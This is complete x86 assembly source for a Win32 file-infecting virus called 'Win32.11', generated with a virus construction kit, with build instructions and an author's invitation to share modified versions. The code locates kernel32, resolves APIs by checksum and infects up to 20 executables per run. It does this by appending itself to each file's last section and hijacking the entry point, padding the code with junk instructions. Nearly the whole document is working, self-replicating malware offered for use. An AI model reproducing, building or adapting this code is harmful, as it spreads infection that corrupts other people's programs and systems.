              
;
;
; Win32.11 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.11
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 11
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 33
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 60260 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 inc esp
 add esp, 3d
 mov ebx, dword ptr [esp-4]
                                        ; mov ebp, ebx
                                        ; clear ebp
 and ebp, 0
 add ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xchg edx, ecx

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 rol ecx, 1d                            ; Trash
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov ecx, offset WFD_szFileName
 add ecx, ebp


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 add eax, -1
 add eax, 1
 jz NoInfection
                                        ; check for minimum filesize
 mov eax, dword ptr [ebp+WFD_nFileSizeLow]
 cmp eax, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 je Notagoodfile
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, ecx
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [edx]
 cmp ebx, 'EP'
 je Goodfile2
                                        ; clear ebx
 and ebx, 0
 cmp ebx, 0
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '11'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 sbb ebx, 22d                           ; Trash
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea esi, [ebp+WFD_szFileName]
 xchg ebx, esi

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
 xor eax, ecx                           ; Trash
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], eax

 mov ecx, dword ptr [ebp+OldEIP]

 push ecx
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 dec ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



;          [ ///// * FindFiles Procedure * \\\\\ ]

 or edx, 88826998d                      ; Trash

FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
 push dword ptr [ebp+FindHandle]
 pop eax
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edi, ebp
 add edi, offset WIN32_FIND_DATA

 push edi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d xor 17d )
 xor ebx, 17d
 lea edx, [ebp+WFD_szFileName]
 xchg edx, esi


ClearOldData2:
 sbb ecx, 16d                           ; Trash
 mov byte ptr [esi], 0h
 xor eax, 58432953d                     ; Trash
                                        ; add esi, 1
 add esi, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 Trash1      dd 0h
 TempAPI     dd 0h
 counter     dw 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h

 TempApisearch2 dd 0h
 OTableVA    dd 0h
 MapAddress  dd 0h
 NTableVA    dd 0h

 APINames:
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h

 KernelPE    dd 0h
 NewSize     dd 0h
 AlignTemp   dd 0h
 OldEIP      dd 0h
 Attributes  dd 0h
 db 'Win32.11 created by SnakeByte',0
 FileHandle  dd 0h
 AlignReg2   dd 0h
 KernelMZ    dd 0h
 InfCounter  dd 0h
 K32Trys     dd 0h
 filemask    db '*.eXE',0
 ATableVA    dd 0h
 OldBase     dd 400000h
 FindHandle  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NewEIP      dd 0h
 MapHandle   dd 0h
 AlignReg1   dd 0h




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need
 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [eax+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 inc edi
 add edi, 27d
                                        ; get ATableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get NTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; add edi, 4
 add edi, 4d
 adc edx, ebx                           ; Trash
                                        ; get OTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx



                                        ; number of API's we're looking for
 mov eax, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APIOffsets]
 xchg ebx, edi

 mov edx, offset APINames
 add edx, ebp


GetApisLoop: 

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add edx, 4
 add edx, 4d
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], ebx
                                        ; add edi, 4
 inc edi
 add edi, 3d
 sub eax, 1
 jnz GetApisLoop
 lea eax, [ebp+Outbreak]
 xchg eax, ebx

 push ebx
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea eax, [ebp+WFD_szFileName]
 xchg esi, eax

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 xor ecx, 76690127d                     ; Trash

                                        ; clear edx
 and edx, 0
 push edx
 push ebx
 push edx
                                        ; mov ecx, 4
 push 4d
 pop ecx
 push ecx
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ebx
 cmp eax, 0
 je CloseFile
                                        ; clear eax
 push 0
 pop eax
 push ebx
 push eax
 push eax
 push 2h
 and edx, 62305901d                     ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 and ecx, ebx                           ; Trash
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [ebp+MapAddress]
 not ebx                                ; Trash
                                        ; retrieve PE - Header
 mov esi, [ecx+3Ch]
 add esi, ecx
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov ebx, [esi]
 dec esi
 sub esi, 59d
 mov eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], ebx
 add eax, VirusSize
 mov ecx, edx                           ; Trash
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov edx, 18442006d                     ; Trash
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infect by increasing the last section
 push ecx
 pop esi
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 sub ebx, 1
 imul ebx, ebx, 28h
                                        ; add ecx, 120
 add ecx, 120d
 add ecx, ebx
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [esi+74h]
 sal ebx, 3
 add ecx, ebx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 and dword ptr [ebp+Trash1], 962156     ; Trash
 mov dword ptr [ebp+OldEIP], edx
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], eax
                                        ; clear eax
 mov eax, -53539d
 add eax, 53539d

 add eax, [ecx+10h]
                                        ; mov edx, eax
 push eax
 pop edx
 add ecx, 14h
 add eax, [ecx]
 sub ecx, 14h
 push eax
 push edx
 pop ebx
 add ebx, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
                                        ; clear ebx
 mov ebx, -10125d
 add ebx, 10125d

 add ebx, [ecx+10h]
 push ebx
                                        ; calculate new section size
 add ebx, VirusSize
 push ebx
 pop dword ptr [ebp+AlignReg1]
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
 mov dword ptr [ecx+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [ecx+08h], ebx
 mov ebx, dword ptr [ecx+10h]
 add ebx, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '11'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize
 lea edx, [ebp+Virus]
 xchg esi, edx


AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 dec ecx
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 add esp, -4d
                                        ; round to pages
 shr eax, 16d
 shl eax, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 62771
 sub dword ptr [ebp+K32Trys], 2771d
 add dword ptr [ebp+Trash1], 1977706    ; Trash

GK1:                                    ; check for DOS-EXE Stub
 mov edx, dword ptr [ebp+K32Trys]
 cmp edx, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je CheckPE
 shr ecx, 23d                           ; Trash

GK2:
 inc eax
 sub eax, 65537d
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edx, [eax+3Ch]
 xchg edx, eax
 add eax, edx
 xchg edx, eax
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 dec edx
 add edx, 23d
                                        ; clear ebx
 mov ebx, 24654d
 sub ebx, 24654d
 mov bx, word ptr [edx]
 and bx, 0F000h
 cmp bx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 inc edx
 sub edx, 23d


KernelFound:
 mov dword ptr [ebp+KernelPE], edx
 mov dword ptr [ebp+KernelMZ], eax

 lea ebx, GetApis
 add ebx, ebp

 push ebx
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]
 xchg eax, edi

                                        ; Set Infection Counter
                                        ; mov edi, 20
 mov edi, ( 20d xor 6d )
 xor edi, 6d
 mov dword ptr [ebp+InfCounter], edi
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 or ebx, ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 and word ptr [ebp+counter], 0h




 push dword ptr [ebp+NTableVA]
 sub dword ptr [ebp+Trash1], 935169     ; Trash
 pop ecx


SearchNextApi1:                         ; search for the API's
 push ecx
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
                                        ; mov ecx, eax
 mov ecx, eax
                                        ; mov edi, eax
 mov edi, eax
 mov dword ptr [ebp+TempApisearch2], edi
 push edx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [edx]
 pop eax
 LoopChsksm:
                                        ; clear ebx
 mov ebx, -26978d
 add ebx, 26978d
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 shl bx,8d
 sub eax, ebx
 test bx, bx
 jz LoopConti
                                        ; clear ebx
 xor ebx, ebx
 mov bl, byte ptr [edi]
 sub eax, ebx
                                        ; add edi, 1
 inc edi
 cmp bx, 0
 jne LoopChsksm
LoopConti:
 test eax, eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edx
 pop ecx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop edi
 add esp, 4h
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, edi
 and ecx, 94318864d                     ; Trash
                                        ; clear eax
 xor eax, eax
 mov ax, word ptr [edi]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [eax]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 mov dword ptr [ebp+Trash1], edx        ; Trash
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 and ecx, 0
 push ecx
 call ExitProcess



end FakeCode

